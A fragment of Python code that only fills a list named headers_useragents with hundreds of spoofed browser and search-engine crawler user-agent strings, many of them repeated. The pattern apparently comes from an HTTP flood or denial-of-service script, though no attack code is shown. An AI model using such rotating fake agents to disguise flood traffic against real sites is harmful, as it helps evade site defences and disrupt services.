                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
